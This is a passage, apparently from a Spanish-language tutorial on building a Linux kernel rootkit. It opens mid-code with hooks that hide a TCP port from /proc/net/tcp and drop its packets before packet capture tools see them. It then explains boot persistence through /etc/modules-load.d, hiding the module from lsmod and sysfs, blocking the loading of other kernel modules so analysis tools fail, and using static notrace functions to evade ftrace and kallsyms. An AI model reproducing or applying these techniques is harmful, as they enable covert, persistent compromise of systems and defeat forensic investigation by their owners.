            return 0; // no escribir esta línea en /proc/net/tcp pa que no lo liste
    }
    return orig_tcp4_seq_show(seq, v);
}

// Hook adicional --> ocultar el tráfico a nivel de captura de paquetes (wireshark)
static int hook_packet_rcv(struct sk_buff *skb, struct net_device *dev,
                            struct packet_type *pt, struct net_device *orig_dev)
{
    // Si el paquete va o viene del puerto oculto, descartarlo silenciosamente
    // antes de que llegue al socket que usa tcpdump
    struct iphdr *iph = ip_hdr(skb);
    if (iph && iph->protocol == IPPROTO_TCP) {
        struct tcphdr *tcph = tcp_hdr(skb);
        if (ntohs(tcph->dest) == PUERTO_OCULTO ||
            ntohs(tcph->source) == PUERTO_OCULTO)
            return 0; // descartar: tcpdump no ve nada
    }
    return orig_packet_rcv(skb, dev, pt, orig_dev);
}
```

# 6. Persistencia 

La persistencia es un proceso fundamental para mantenernos ocultos el mayor tiempo posible sin ser vistos.

# 6.1 Persistencia al reiniciar

Cargar un módulo con `insmod` no sirve de nada si se reinicia. Para mantener persistencia usamos `/etc/modules-load.d/` durante el boot.

La idea es copiar el `.ko` al directorio de módulos de kernel en uso `/usr/lib/modules/$(uname -r)/kernel` después actualizas la db de módulos con `depmod` para que el kernel no tenga problemas con dependencias y creas un archivo de configuración con el nombre de el módulo en `/etc/modules-load.d/`. Desde ese momento, el sistema carga el rootkit aunque se reinicie.

**NOTA IMPORTANTE**: Los archivos `.ko` y `.conf` deben estar ocultos mediante otro rootkit que se hooke `getdents64`. Desde cualquier directorio que los contenga.

Cuando cargamos un módulo con `insmod` esto al reiniciar ya no será efectivo. Para esto es mejor usar 

# 6.2 lsmod y sysfs

El kernel tiene una lista de módulos cargados accesible en `Ring 3` con `lsmod`. Con `list_del(&THIS_MODULE->list)` lo borramos de esa lista.

A mayores deberíamos borrarlo también de el árbol kobject de sysfs con `kobject_del(&THIS_MODULE->mkobj.kobj)` para que tampoco aparezca en `/sys/module`.

Si juntamos ambas el módulo será totalmente invisible a cualquier tool de módulos.

# 6.3 Bloquear otros módulos 

Cuando el rootkit está activo. Necesitamos protegernos de herramientas de análisis puedan ser cargadas en nuevos módulos.

Las `syscalls` para carga de módulos son `sys_init_module` y `sys_finit_module`. Si hookeamos ambas y hacemos que devuelvan 0 sin ejecutar nada, bloqueamos totalmente la carga de cualquier `módulo`.

`insmod` funcionará pero el módulo nunca se cargará ni ejecutará su `module_init`. Desde el usuario parece que funciona aunque la realidad es otra.

# 6.4 Ocultar funciones en tracing 

Las funciones de un `rootkit` que no son `estáticas` aparecen en `/sys/kernel/tracing/available_filter_functions` y también en `/proc/kallsyms` lo que muestra el módulo que metamos aunque esté oculto de `lsmod`. Hay dos formas de evitar esto.

La primera opción es declarar las variables como `static` al programar con C, esto hace que el kernel no los exporte como símbolos. 

La otra forma es con: `notrace (__attribute__((no_instrument_function))` que le dice al compilador que no inserte llamadas de `ftrace` en esa función en específico. Esto lo hace invisible al `tracing` incluso siendo pública. Esto lo hace invisible y no hookeable por otros.

```sh
// función invisible para ftrace, available_filter_functions y kallsyms
static notrace void nucleo_del_rootkit(void) {
    // toda la lógica aquí
}

// Esta función sí aparece en available_filter_functions
// (es el punto de entrada visible y normal del módulo)
static int __init modulo_init(void) {
    nucleo_del_rootkit();
    list_del(&THIS_MODULE->list);
    return 0;
}
```
